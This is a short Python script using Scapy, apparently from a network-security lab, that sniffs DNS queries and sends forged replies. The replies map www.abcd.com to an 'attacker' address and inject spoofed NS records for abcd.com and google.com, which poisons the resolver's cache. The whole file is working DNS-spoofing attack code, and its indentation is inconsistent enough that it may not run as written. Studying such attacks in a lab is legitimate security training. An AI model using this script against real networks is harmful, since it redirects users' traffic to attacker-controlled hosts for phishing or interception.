#!/usr/bin/python3
from scapy.all import *

user		="172.17.0.2"
DNS_server	="172.17.0.3"
attacker	="172.17.0.4"
host		="192.168.62.19"

def spoof_dns(pkt):
	#ls(pkt)
	if (DNS in pkt and b'www.abcd.com' in pkt[DNS].qd.qname):

		# Swap the source and destination IP address
		IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        
		# Swap the source and destination port number
		UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
        
		# The Answer Section
        
		Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',ttl=259200, rdata=attacker)
        
		# The Authority Section
		NSsec1 = DNSRR(rrname='abcd.com', type='NS',ttl=259200, rdata='ns.2004lpx.com')
        NSsec2 = DNSRR(rrname='google.com', type='NS', ttl=259200, rdata='ns.2004lpx.com')
        
       	# The Additional Section
     
		Addsec1 = DNSRR(rrname='www.2004lpx.com', type='A',ttl=259200, rdata=attacker)
		Addsec2 = DNSRR(rrname='ns.2004lpx.com', type='A',ttl=259200, rdata=attacker)
        
	# Construct the DNS packet
		DNSpkt = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,
		aa=1,rd=0,qr=1,qdcount=1,ancount=1,nscount=2,arcount=2,
		an=Anssec,ns=NSsec1/NSsec2,ar=Addsec1/Addsec2)
	
		#an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)
		# Construct the entire IP packet and send it out
		spoofpkt = IPpkt/UDPpkt/DNSpkt
		send(spoofpkt)
    
# Sniff UDP query packets and invoke spoof_dns().
iface="docker0"
pkt = sniff(filter='udp and dst port 53 and src host 172.17.0.3 ', prn=spoof_dns,iface=iface)
